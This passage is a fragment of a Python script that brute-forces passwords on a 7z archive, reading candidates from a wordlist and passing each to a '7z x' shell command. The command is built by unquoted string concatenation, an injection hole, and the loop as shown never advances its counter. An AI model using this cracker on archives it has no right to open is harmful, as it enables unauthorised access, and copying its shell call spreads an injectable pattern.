		print('if it contain spaces the type ' ' between name .... ')
		name_inside=input(green+'input the name of the one of the file inside it : '+yellow)
		os.chdir(path_of_7z)
		k=0
		while True:
			with open(txt_file_path , 'r') as op:
				f = op.readlines()
				jo=(f[k])
				kq=jo.replace('\n', '')
				print(blue+'trying password '+end+green+kq+end+yellow+'......'+end)
				time.sleep(1)
				f == op.readlines()
				os.system('7z x '+name_of_7z+' -p'+kq)
